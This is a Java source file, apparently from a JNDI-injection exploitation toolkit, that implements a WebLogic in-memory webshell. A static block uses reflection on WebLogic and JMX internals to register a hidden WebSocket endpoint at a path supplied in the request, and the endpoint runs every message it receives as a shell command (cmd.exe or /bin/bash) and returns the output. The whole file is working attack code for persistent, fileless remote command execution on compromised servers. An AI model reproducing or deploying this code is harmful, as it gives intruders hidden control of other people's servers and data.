package com.qi4l.jndi.template.memshell.weblogic;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.glassfish.tyrus.server.TyrusServerContainer;
import weblogic.servlet.internal.HttpConnectionHandler;
import weblogic.servlet.internal.ServletRequestImpl;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.servlet.provider.ContainerSupportProviderImpl;

import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;
import java.io.InputStream;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.util.HashSet;
import java.util.Set;

public class WsWeblogic extends Endpoint implements MessageHandler.Whole<String> {

    static {
        try {
            Thread threadLocal = Thread.currentThread();
            Field  workEntry   = threadLocal.getClass().getDeclaredField("workEntry");
            workEntry.setAccessible(true);
            weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor wlsRequestExecutor = (ContainerSupportProviderImpl.WlsRequestExecutor) workEntry.get(threadLocal);
            Field                                                                     field1             = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
            field1.setAccessible(true);
            weblogic.servlet.internal.HttpConnectionHandler connectionHandler = (HttpConnectionHandler) field1.get(wlsRequestExecutor);
            ServletRequestImpl                              request           = connectionHandler.getServletRequest();
            String                                          path              = request.getParameter("path");
            ServerEndpointConfig                            configEndpoint    = ServerEndpointConfig.Builder.create(WsWeblogic.class, path).build();
            MBeanServer                                     server            = ManagementFactory.getPlatformMBeanServer();
            Field                                           field             = server.getClass().getDeclaredField("wrappedMBeanServer");
            field.setAccessible(true);
            Object obj = field.get(server);
            field = obj.getClass().getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            obj = field.get(obj);
            field = obj.getClass().getDeclaredField("repository");
            field.setAccessible(true);
            Repository       repository   = (Repository) field.get(obj);
            Set<NamedObject> namedObjects = repository.query(new ObjectName("com.bea:Type=ApplicationRuntime,*"), null);
            for (NamedObject namedObject : namedObjects) {
                field = namedObject.getObject().getClass().getDeclaredField("managedResource");
                field.setAccessible(true);
                obj = field.get(namedObject.getObject());
                field = obj.getClass().getSuperclass().getDeclaredField("children");
                field.setAccessible(true);
                HashSet set = (HashSet) field.get(obj);
                for (Object o : set) {
                    if (o.getClass().getName().endsWith("WebAppRuntimeMBeanImpl")) {
                        field = o.getClass().getDeclaredField("context");
                        field.setAccessible(true);
                        WebAppServletContext servletContext = (WebAppServletContext) field.get(o);
                        TyrusServerContainer container      = (TyrusServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
                        try {
                            container.register((jakarta.websocket.server.ServerEndpointConfig) configEndpoint);
                            System.out.println("add success,path: " + servletContext.getContextPath() + path);
                        } catch (Exception e) {

                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }

    }

    private Session session;

    @Override
    public void onMessage(String s) {
        try {
            Process process;
            boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
            if (bool) {
                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", s});
            } else {
                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", s});
            }
            InputStream   inputStream   = process.getInputStream();
            StringBuilder stringBuilder = new StringBuilder();
            int           i;
            while ((i = inputStream.read()) != -1)
                stringBuilder.append((char) i);
            inputStream.close();
            process.waitFor();
            session.getBasicRemote().sendText(stringBuilder.toString());
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    @Override
    public void onOpen(Session session, EndpointConfig endpointConfig) {
        this.session = session;
        session.addMessageHandler(this);
    }
}
